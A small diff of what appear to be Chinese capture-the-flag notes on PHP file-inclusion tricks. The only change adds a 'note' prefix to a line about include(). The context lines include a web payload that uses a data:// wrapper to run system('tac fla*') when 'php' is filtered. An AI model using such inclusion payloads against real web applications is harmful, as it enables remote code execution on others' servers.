@@ -44,7 +44,7 @@
 
 * php被过滤的时候:
 * ?c=data://text/plain,<?=system("tac fla*")?>
-* include()只会处理<?php>里面的内容
+* 注：include()只会处理<?php>里面的内容
 
 <br>
 
